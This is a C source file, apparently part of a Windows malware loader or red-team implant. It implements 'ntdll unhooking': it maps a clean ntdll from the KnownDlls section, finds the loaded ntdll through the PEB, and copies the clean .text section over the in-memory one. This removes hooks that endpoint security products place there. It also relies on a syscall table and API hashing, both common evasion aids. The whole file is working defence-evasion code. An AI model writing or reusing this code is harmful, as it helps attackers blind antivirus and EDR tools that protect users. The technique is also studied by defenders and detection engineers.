#include <Windows.h>
#include "Common.h"
#include "Structs.h"
#include "Debug.h"

extern VX_TABLE		g_Sys;
extern API_HASHING	g_Api;


BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {
	
#ifdef DEBUG
	PRINTA("[DBG] MapNtdllFromKnownDlls entered | ppNtdllBuf = 0x%p\n", ppNtdllBuf);
#endif

	HANDLE				hSection			= NULL;
	PBYTE				pNtdllBuffer		= NULL;
	NTSTATUS			STATUS				= NULL;
	UNICODE_STRING		UnicodeStr			= { 0 };
	OBJECT_ATTRIBUTES	ObjectAtt			= { 0 };

	UnicodeStr.Buffer = (PWSTR)NTDLL;
	UnicodeStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
	UnicodeStr.MaximumLength = UnicodeStr.Length + sizeof(WCHAR);

#ifdef DEBUG
	PRINTA("[DBG] NTDLL path = %ws\n", UnicodeStr.Buffer);
	PRINTA("[DBG] Length = %d | MaxLength = %d\n",
		UnicodeStr.Length, UnicodeStr.MaximumLength);
#endif

	InitializeObjectAttributes(&ObjectAtt, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
	
	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtOpenSection");
	
	STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ, &ObjectAtt);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtOpenSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		goto _EndOfFunction;
	}

#ifdef DEBUG
	PRINTA("[DBG] NtOpenSection STATUS = 0x%08X | hSection = 0x%p\n",
		STATUS, hSection);
#endif

	pNtdllBuffer = g_Api.pMapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
#ifdef DEBUG
		PRINTA("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
#endif
		goto _EndOfFunction;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunction:
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}



PVOID FetchNtdllBaseAddress() {
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}


BOOL ReplaceNtdllTextSection(IN PVOID UnhookedNtdll) {

	PVOID				pLocalNtdll			= (PVOID)FetchNtdllBaseAddress();
	NTSTATUS			STATUS				= NULL;

	PIMAGE_DOS_HEADER	pImgDosHdr			= (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pImgDosHdr && pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS	pImgNtHdrs			= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	PVOID				pLocalNtdllText		= NULL,
						pRemoteNtdllText	= NULL;
	SIZE_T				sNtdllTextSize		= 0;

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pImgNtHdrs);

	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllText	 = (PVOID)((ULONG_PTR)pLocalNtdll   + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllText = (PVOID)((ULONG_PTR)UnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTextSize	 = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pLocalNtdllText || !pRemoteNtdllText || !sNtdllTextSize)
		return FALSE;

	if (*(ULONG*)pLocalNtdllText != *(ULONG*)pRemoteNtdllText)
		return FALSE;

	DWORD dwOldProtect = 0;

	if (!g_Api.pVirtualProtect(pLocalNtdllText, sNtdllTextSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
#ifdef DEBUG
		PRINTA("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	_memcpy(pLocalNtdllText, pRemoteNtdllText, sNtdllTextSize);

	if (!g_Api.pVirtualProtect(pLocalNtdllText, sNtdllTextSize, dwOldProtect, &dwOldProtect)) {
#ifdef DEBUG
		PRINTA("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
	
	return TRUE;
}
